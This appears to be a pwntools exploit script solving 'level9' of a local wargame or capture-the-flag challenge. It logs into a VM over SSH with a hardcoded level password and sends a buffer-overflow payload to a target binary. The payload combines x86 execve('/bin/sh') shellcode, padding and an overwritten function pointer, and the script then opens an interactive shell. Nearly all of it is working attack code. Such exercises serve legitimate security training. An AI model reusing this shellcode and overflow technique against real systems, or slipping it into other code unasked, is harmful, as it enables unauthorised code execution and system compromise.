#!/usr/bin/env python

from pwn import *

host = "127.0.0.1"
port = 4242

login = "level9" 
binary = login
password = "c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a" 


remotebinary = "/home/user/%s/%s" % (login, binary)

shell = ssh(host=host, port=port, user=login, password=password)

### Exploit ###

shellcode       = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
addr_annotation = p32(0x0804a00c)
addr_fake       = p32(0x0804a010)

arg1 = addr_fake + shellcode + (108 - len(addr_fake) - len(shellcode)) * b"A" + addr_annotation  # Padding until reaching or function pointer that will be executed

p = shell.process([remotebinary, arg1], env={})

p.interactive()